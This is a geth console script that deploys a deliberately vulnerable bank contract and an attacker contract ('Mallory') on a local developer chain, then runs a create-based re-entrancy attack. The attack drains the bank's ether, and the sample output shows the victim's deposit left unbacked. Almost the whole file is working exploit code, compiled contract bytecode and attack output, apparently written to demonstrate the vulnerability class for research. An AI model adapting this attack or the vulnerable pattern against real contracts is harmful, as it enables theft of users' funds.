// Script for deploying and running a create-based re-entrancy attack against a
// crafted vulnerable contract (see create-based.sol)
//
// usage:
// first start geth in developer mode (no mining difficulty and prefundend
// accounts) and start the JavaScript console interface of geth:
//
// $ geth --dev --dev.period=1 console
//
// Then load this script to setup everything:
//
// > loadScript("create-based_setup.js")
//
// Sometimes it takes a while for all contracts to be mined and commited to the
// dev blockchain. Manually creating more transactions helps. Simply type:
//
// > transferSomething()
//
// If both the Token and Mallory contracts have been mined, the attack can be
// started:
//
// > triggerAttack()
//
//
// Example:
//
// > loadScript("./create-based_setup.js")
//
// === Create-Based Re-Entrancy Attack Example ===
//
// prefunded balance: 1.15792089237316195423570985008687907853269984665640564039357584007913129639927e+77
// attacker balance: 100000000000000000000
// Creating bank contract
// null [object Object]
// Creating mallory contract
// null [object Object]
//
// ===============================================================================
// Wait for Bank and Mallory contracts to be mined.
// Sometimes things hang and manually calling the transferSomething() function a bunch of times until all contracts are mined resolves this. You should see a message that Mallory and Bank contract are mined.
//
// Use triggerAttack() to start the attack
// ===============================================================================
//
// true
// null [object Object]
// Contract mined! address: 0x2bbe8fc806b3f8a603a1ecbba0bf9076dbc541f4 transactionHash: 0xaa851c6a349d4ec1bac36f4a42fe6c042932e983690dca25f943c6ed9565ba5c
// null [object Object]
// Mallory Contract mined! address: 0x6571cd964ee48f420e8c975791d7f5f7990456b9 transactionHash: 0x05f0213200e0a0c0fb664ab092fdbbe93560204a54c06e4a366e210b97c63e46
//
// > t = triggerAttack()
//
// [+] Current status:
// mallory has 1000000 wei
// mallory has 0 wei deposited in Bank
// bank    has 1000000 wei
// victim  has 1000000 wei deposited in Bank
//
// [+] Executing attack
// [+] ... done (waiting for a couple of blocks)
//
// [+] Current status:
// mallory has 2000000 wei
// mallory has 1.15792089237316195423570985008687907853269984665640564039457584007913128639936e+77 wei deposited in Bank
// bank    has 0 wei
// victim  has 1000000 wei deposited in Bank
// Warning: bank doesn't have enough ether to give back victim's money
//
// mallory gained 1000000 wei
// [+] attack status: SUCCESS
//


console.log("\n=== Create-Based Re-Entrancy Attack Example ===\n")

var defaultPassword = "";

personal.newAccount(defaultPassword)
personal.newAccount(defaultPassword)
function unlockAllAccounts() {
  // this is the prefundend dev contract
  personal.unlockAccount(eth.accounts[0], defaultPassword)
  // we'll use this as "attacker"
  personal.unlockAccount(eth.accounts[1], defaultPassword)
}
unlockAllAccounts()

eth.sendTransaction({from: eth.accounts[0], to: eth.accounts[1], value: 100000000000000000000})
admin.sleepBlocks(2)

console.log("prefunded balance: " + eth.getBalance(eth.accounts[0]))
console.log("attacker balance: " + eth.getBalance(eth.accounts[1]))

function transferSomething() { // just transfer something to make geth commit the next block
  //console.log("(Transferring some ether)")
  eth.sendTransaction({from: eth.accounts[0], to: eth.accounts[2], value: 100})
  admin.sleepBlocks(1)
}

transferSomething()

console.log("Creating bank contract")
var bankContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"deposit","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"a","type":"address"}],"name":"getBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]);
var bank = bankContract.new(
  {
    from: web3.eth.accounts[0],
    data: '0x608060405234801561001057600080fd5b506106ec806100206000396000f3fe608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680632e1a7d4d1461005c578063d0e30db014610097578063f8b2cb4f146100a1575b600080fd5b34801561006857600080fd5b506100956004803603602081101561007f57600080fd5b8101908080359060200190929190505050610106565b005b61009f610358565b005b3480156100ad57600080fd5b506100f0600480360360208110156100c457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506103a6565b6040518082815260200191505060405180910390f35b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101515610355573033826101586103ee565b808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019350505050604051809103906000f0801580156101e4573d6000803e3d6000fd5b50600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015610353573d6000803e3d6000fd5b505b50565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6040516102c2806103ff8339019056fe608060405234801561001057600080fd5b506040516060806102c28339810180604052606081101561003057600080fd5b81019080805190602001909291908051906020019092919080519060200190929190505050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555082600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806002819055508173ffffffffffffffffffffffffffffffffffffffff16630242deb8306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561017857600080fd5b505af115801561018c573d6000803e3d6000fd5b50505050505050610120806101a26000396000f3fe608060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633ccfd60b146041575b005b348015604c57600080fd5b5060536055565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141560f2573373ffffffffffffffffffffffffffffffffffffffff166108fc6002549081150290604051600060405180830381858888f1935050505015801560f0573d6000803e3d6000fd5b505b56fea165627a7a723058205d70fe64375e019ade8d160d402812b04bb65d05d139c6681729e0fc459cda760029a165627a7a7230582049c936fb0df07082806ded68281194b2acc01dfcd61f9b3c74ba0c5c2ee2c19c0029',
     gas: '4700000'
  }, function (e, contract){
    console.log(e, contract);
    if (typeof contract.address !== 'undefined') {
      console.log('Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
    }
  })

transferSomething()

console.log("Creating mallory contract")
var malloryContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"what","type":"address"}],"name":"registerIntermediary","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"name":"b","type":"address"},{"name":"amount","type":"uint256"}],"name":"attack","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"withdrawAll","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"payable":true,"stateMutability":"payable","type":"fallback"}]);
var mallory = malloryContract.new(
  {
    from: web3.eth.accounts[1],
    data: '0x608060405234801561001057600080fd5b5061087f806100206000396000f3fe608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630242deb81461005957806352fba25c1461009d578063853828b6146100eb575b005b61009b6004803603602081101561006f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610102565b005b6100e9600480360360408110156100b357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610353565b005b3480156100f757600080fd5b50610100610715565b005b600060015414156102f6576001808190555080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f8b2cb4f306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b15801561024c57600080fd5b505afa158015610260573d6000803e3d6000fd5b505050506040513d602081101561027657600080fd5b81019080805190602001909291905050506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b1580156102d957600080fd5b505af11580156102ed573d6000803e3d6000fd5b50505050610350565b60018054141561034e57600260018190555080600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555061034f565b5b5b50565b6000600181905550816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b15801561042057600080fd5b505af1158015610434573d6000803e3d6000fd5b50505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f8b2cb4f306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b15801561053057600080fd5b505afa158015610544573d6000803e3d6000fd5b505050506040513d602081101561055a57600080fd5b81019080805190602001909291905050506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b1580156105bd57600080fd5b505af11580156105d1573d6000803e3d6000fd5b50505050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561065b57600080fd5b505af115801561066f573d6000803e3d6000fd5b50505050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156106f957600080fd5b505af115801561070d573d6000803e3d6000fd5b505050505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561079b57600080fd5b505af11580156107af573d6000803e3d6000fd5b50505050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561083957600080fd5b505af115801561084d573d6000803e3d6000fd5b5050505056fea165627a7a72305820a9b96cb8c1f999e729f1b9fa2bdfa020a9bcd4f737ee353c7d23a264a598b1240029',
     gas: '4700000'
  }, function (e, contract){
    console.log(e, contract);
    if (typeof contract.address !== 'undefined') {
      console.log('Mallory Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
    }
  })

admin.sleepBlocks(1)
transferSomething()

console.log("\n===============================================================================")
console.log("Wait for Bank and Mallory contracts to be mined.")
console.log("Sometimes things hang and manually calling the transferSomething() function a bunch of times until all contracts are mined resolves this. You should see a message that Mallory and Bank contract are mined.")
console.log("\nUse triggerAttack() to start the attack")
console.log("===============================================================================\n")


var _fundsInBank = 1000000;

function donateInitial() {
  // victim deposits something into the bank
  bank.deposit({from: eth.accounts[0], value: _fundsInBank	})
  // attacker funds mallory contract
  eth.sendTransaction({from: eth.accounts[1], to: mallory.address, value: _fundsInBank})
  admin.sleepBlocks(1);
}

function printStatus() {
  console.log("")
  console.log("[+] Current status:")
  console.log("mallory has " + eth.getBalance(mallory.address) + " wei")
  console.log("mallory has " + bank.getBalance(mallory.address) + " wei deposited in Bank")
  console.log("bank    has " + eth.getBalance(bank.address) + " wei")
  console.log("victim  has " + bank.getBalance(eth.accounts[0]) + " wei deposited in Bank")
  if (eth.getBalance(bank.address) < bank.getBalance(eth.accounts[0])) {
    console.log("Warning: bank doesn't have enough ether to give back victim's money")
  }
  console.log("")
}

function triggerAttack() {
  transferSomething();
  donateInitial();
  transferSomething();

  var preBalance = eth.getBalance(mallory.address)
  printStatus()

  console.log("[+] Executing attack")
  var t = mallory.attack(bank.address, _fundsInBank, {from: eth.accounts[1], gas: '4700000'})
  console.log("[+] ... done (waiting for a couple of blocks)")

  transferSomething();
	admin.sleepBlocks(3);
  printStatus()

  var gains = (eth.getBalance(mallory.address) - preBalance);
  console.log("mallory gained " + gains + " wei");
  if (gains > 0) {
    console.log("[+] attack status: SUCCESS");
  } else {
    console.log("[+] attack status: FAIL");
  }

  return t;
}

function getAttackTrace() {
  a = triggerAttack();
  return debug.traceTransaction(a);
}

transferSomething()
